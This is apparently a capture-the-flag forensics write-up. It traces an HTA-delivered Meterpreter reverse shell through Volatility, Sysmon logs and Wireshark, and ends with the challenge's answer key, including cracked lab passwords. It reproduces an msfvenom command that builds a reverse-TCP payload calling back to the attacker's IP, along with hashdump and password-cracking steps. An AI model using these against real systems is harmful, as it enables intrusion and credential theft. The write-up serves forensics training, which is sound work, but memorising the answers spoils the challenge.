We are given a PCAP (Wireshark), Sysmon Logs and a Raw of Memory (Volatility).

First of all, we analyze the .raw with volatility with the Win7SP1x86 profile. To do so, first of all we execute the pslist command to check all the processes in the memory. In it, we see that there are 2 processes that call the powershell.exe with ids = (3888,5056). Checking more information about process 3888, we discover that a hidden code was executed in the powershell. The code is in base64 and we must decode it using Cyberchef by terminal, using the command:  

	base64 --decode ps1.txt

This way, we obtain the executed script by the attacker. We can also see that we get the following field:

- "ParentCommandLine": "\"C:\\Windows\\System32\\mshta.exe\" \"C:\\Users\\Sam\\Downloads\\sample_template.hta\" "

“.hta” files are automatically run using the “mshta.exe” program. It is very convenient for attackers as mshta.exe is a binary that is signed by microsoft hence reducing suspicion.

To find how this payload was generated we can do a quick google search if we don’t have much idea about msf-venom. In this case the flag “hta-psh” was used to create a malicious hta file that will spawn powershell. We can guess what the command for msf-venom would look like:

`msfvenom -p windows/meterpreter/reverse_tcp lhost=172.16.0.5 lport=80 -f hta-psh > sample_template.hta`

We can see that the commandline that origininated the powershell.exe was this one. As we can see, the sample_template.hta file was executed. The .hta extension is an HTML application extension. 

On the other hand, checking the ID 5056, we can observe the following fields, which looks like the attacker is communicating to an external IP (172.16.0.5) using the port 80. 

- "SourceIp:" "172.16.0.4"
- "DestinationIp": "172.16.0.5"
- "DestinationPort": 80
- "SourcePort": 50055

Once, we got this info, we can open the PCAP file in Wireshark. In the filter section we will introduce the following: 

- ip.dst == 172.16.0.5 && ip.src == 172.16.0.4

As can be seen in the first package, we see a SYN and then 4 ACKs as response, thing that is really suspicious. 

![[Pasted image 20221016153254.png]]

We go back to the script, where we can see that the process runs without using the operation system shell, by the following field:

- \$s.UseShellExecute=$false

We can also check  the compression stream that has been used in the payload (GzipStream):

- create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream

Now we will identify the exfiltrated hashes, to do so we will use Volatility since the hashes are stored in the memory. We execute the following code:

	volatility -f WINADMIN.raw --profile=Win7SP1x86 hashdump

As we can see, there are 6 different user hashes.  For each user, we have the username, the first number is the ID of the account, the first hash is the LM hash and the second is NTLM hash. LM hash is weaker than NTLM hash so is easier to break. To decrypt we will use hashes.com, and we will find that the password of SAM is StandardUser. 

![[Pasted image 20221016160631.png]]

Now we want to know what port the attacker used after cracking the password. To do so, we execute:

	volatility -f WINADMIN.raw --profile=Win7SP1x86 netscan | grep 172.16.0.5

We will see that there are 2 outgoing connections to 172.16.0.5 from 172.16.0.4 using ports 50055 and 22. 22 is the port we are looking for. Finally, searching events where powershell.exe was executed we can observe that in one jaws-enum.ps1 is executed.

## What is the attacker IP, and what is the port that they got a reverse shell on?

172.16.0.5, 80

## What's the name of the malicious file that gave remote access to attacker?

sample_template.hta

## What is the process that has been called by the payload upon execution?

powershell.exe

## Knowing the payload name and process name, if the payload was generated by msfvenom, what would be the format option that the attacker would’ve used?

hta-psh

## What property in the executed script says that the process runs without using the operation system shell?

UseShellExecute

## What is the compression stream that has been used in the payload?

GzipStream

## From the SAM and SYSTEM file that has been exfiltrated, how many user’s hashes would’ve been identified?

6

## What is the password of the SAM?

StandardUser

## What is the password of the Admin?

Passw0rd!

## What is the port the attacker used to login to the system after cracking the passwords?

22

## Are there any other scripts the attacker executed on the system? Find the name of the script

jaws-enum.ps1